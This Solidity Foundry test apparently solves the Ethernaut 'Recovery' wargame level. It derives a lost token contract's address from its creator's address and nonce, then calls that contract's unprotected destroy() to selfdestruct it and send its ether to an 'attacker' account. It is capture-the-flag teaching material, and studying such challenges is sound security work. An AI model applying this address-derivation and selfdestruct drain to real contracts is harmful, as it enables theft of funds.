// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import {Ethernaut} from "src/core/Ethernaut-08.sol";
import {RecoveryFactory, Recovery} from "src/levels/17-Recovery/RecoveryFactory.sol";
import {SimpleToken} from "src/levels/17-Recovery/Recovery.sol";

contract RecoveryTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    address attacker = makeNameForAddress("attacker");

    function setUp() public {
        emit log_string("Setting up Recovery level...");
        ethernaut = new Ethernaut();
        vm.deal(attacker, 0.001 ether);
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function testRecoveryExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        RecoveryFactory recoveryFactory = new RecoveryFactory();

        ethernaut.registerLevel(recoveryFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(recoveryFactory);
        Recovery recoveryContract = Recovery(payable(levelAddress));

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_named_address("Attacker's address", attacker);
        emit log_named_uint(
            "Attacker's balance before destroying",
            attacker.balance
        );
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        address lostAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            recoveryContract,
                            bytes1(0x01)
                        )
                    )
                )
            )
        );
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_named_address("Lost contract address", lostAddress);
        emit log_named_uint(
            "Lost contract balance before destroying",
            lostAddress.balance
        );
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string("Starting the exploit...");
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        SimpleToken(payable(lostAddress)).destroy(payable(attacker));

        emit log_named_uint(
            "Lost contract balance after destroying",
            lostAddress.balance
        );

        emit log_named_uint(
            "Attacker's balance after destroying",
            attacker.balance
        );
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        // Test assertion
        assertEq(lostAddress.balance, 0);

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
